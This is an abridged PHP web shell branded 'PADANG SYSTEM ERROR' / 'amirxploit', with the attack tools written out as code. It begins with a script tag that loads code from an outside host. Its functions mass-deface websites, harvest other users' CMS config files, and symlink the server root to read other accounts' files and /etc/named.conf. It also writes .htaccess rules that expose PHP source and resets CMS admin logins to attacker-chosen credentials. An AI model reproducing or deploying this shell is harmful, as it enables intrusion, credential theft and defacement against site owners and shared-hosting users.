<script src=http://Padangsystems.com/kaydet.php></script>
<?php
...
<html>
	<head>
		...
		<meta name="author" content="DIMAX66"/>
		<meta name="copyright" content="{ DIMAX66 }"/>
		</style>
<style>
body{
background-image: url(https://kosred.com/a/ufwfla.jpg);
  ...
  height: 100%;
		...
		<title>{ DIMAX66 }</title>
		<link rel="icon" type="image/png" href="https://kosred.com/a/ufwfla.jpg"/>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="https://facebook.com/padangsystem" class="text-muted fixed-bottom mb-3">Copyright 2015 PADANG SYSTEM ERROR</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ padang system error }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ padang system error } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { padang system error }</small>
		</div>
	</div><br/>';
	exit;
}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { amirxploit Jakarta Ghost }'></textarea><br/>
...
function aksiConfig($dir,$file){
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("amirxploit_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("amirxploit_config/.htaccess","w");
		fwrite($htc, $isi_htc);
			...
			if(is_readable($user_config_dir)){
				...
				foreach($grab_config as $config => $nama_config){
					...
					if($ambil_config == ''){
						...
						$file_config = fopen("amirxploit_config/$user_con-$nama_config.txt","w");
		...
		<a href='?dir=$dir/amirxploit_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
	}else{
		echo "<form method='post'>
...
function aksiSym($dir,$file){
	...
	if(!$d0mains){
		die ("[ <a href='?dir=$dir&aksi=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&aksi=sym_404'>Symlink 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVmembaca  /etc/named.conf</font><br/><br/>");
	}
	##htaccess
	if($d0mains){
		@mkdir("amirxploit_sym",0777);
		@chdir("amirxploit_sym");
		@exe("ln -s / root");
				...
				if(eregi("zone",$d0main)){
					...
					if(strlen(trim($domains[1][0])) > 2){
						...
						echo "<tr>
							...
							<td>".$user['name']."</td>
							<td><a href='$full/amirxploit_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
						</tr>";
						flush();
						$dcount++;
					}
			...
			<table class='text-center table-responsive'>
				...
				while(!feof($file)){
					...
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/amirxploit_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
...
function aksiSymread($dir,$file){
	...
	<textarea class='form-control' rows='13' name='file'>";
		...
		if ($r3ad){
			...
			if ($sm){
				$r3ad = @fopen('amirxploit_sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
...
function sym404($dir,$file){
	$cp = get_current_user();
	if($_POST['execute']){
		@rmdir("amirxploit_sym404");
		@mkdir("amirxploit_sym404", 0777);
		$dir = $_POST['dir'];
		$isi = $_POST['isi'];
		@system("ln -s ".$dir."amirxploit_sym404/".$isi);
		@symlink($dir,"amirxploit_sym404/".$isi);
		$inija = fopen("amirxploit_sym404/.htaccess", "w");
		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
		echo'<a href="/amirxploit_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
	}else{
...
function autoEdit($dir,$file){
	if($_POST['hajar']){
		...
		<form method='post'>
			...
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='amirxploit' class='form-control mb-3' placeholder='Set Username'>
			<input type='text' name='pass_baru' value='amirxploit' class='form-control mb-4' placeholder='Set Password'>
...
<html>
	<head>
		...
		<meta name="copyright" content="{ amirxploit Jakarta Ghost }"/>
		<link rel="icon" type="image/png" href="https://www.holiq.projectku.ga/amirxploit.png"/>
		<title>{ PADANG SYSTEM ERROR SHELL }</title>
	...
	<body class="bg-dark text-light">
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/padangsystemerror" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/padang padangsystemerror" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/padangsystemerror" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://Escobarpdng" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://padangsystemerror" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/amirxploitOfficial" style="color:#ffffff;">{ Dimax66 }</h1>
...
';
					...
					foreach($scandir as $file){
						...
						echo '<tr class="text-center">
							...
							if($ext == "php"){
								echo 'https://cdn-icons-png.flaticon.com/512/2306/2306154.png"';
							}elseif ($ext == "html"){
								echo 'https://cdn-icons-png.flaticon.com/512/186/186320.png"';
							}elseif ($ext == "css"){
								echo 'https://cdn-icons-png.flaticon.com/512/186/186319.png"';
							}elseif ($ext == "png"){
								echo 'https://cdn-icons-png.flaticon.com/512/136/136523.png"';
							}elseif ($ext == "jpg"){
								echo 'https://cdn-icons-png.flaticon.com/512/136/136524.png"';
							}elseif ($ext == "jpeg"){
								echo 'http://i.imgur.com/e8mkvPf.png"';
							}elseif($ext == "zip"){
								echo 'https://cdn-icons-png.flaticon.com/512/337/337960.png"';
							}elseif ($ext == "js"){
								echo 'https://cdn-icons-png.flaticon.com/512/2306/2306122.png';
							}elseif ($ext == "ttf"){
								echo 'https://cdn-icons-png.flaticon.com/512/2306/2306182.png';
							}elseif ($ext == "otf"){
								echo 'https://cdn-icons-png.flaticon.com/512/2306/2306149.png';
							}elseif ($ext == "txt"){
								echo 'https://cdn-icons-png.flaticon.com/512/2306/2306185.png';
							}elseif ($ext == "ico"){
								echo 'https://cdn-icons-png.flaticon.com/512/2266/2266805.png';
							}elseif ($ext == "conf"){
								echo 'https://cdn-icons-png.flaticon.com/512/627/627495.png';
							}elseif ($ext == "htaccess"){
								echo 'https://fileproinfo.com/images/htaccess_file_extension.png';
							}elseif ($ext == "sh"){
								echo 'https://cdn-icons-png.flaticon.com/512/7488/7488714.png';
							}elseif ($ext == "py"){
								echo 'https://cdn-icons-png.flaticon.com/512/180/180867.png';
							}elseif ($ext == "indsc"){
								echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
							}elseif ($ext == "sql"){
								echo 'https://cdn-icons-png.flaticon.com/512/4248/4248443.png';
							}elseif ($ext == "pl"){
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://padang system.com/">Copyright 2019 { dimax66 Download padang system error }</a></center><br/>';	
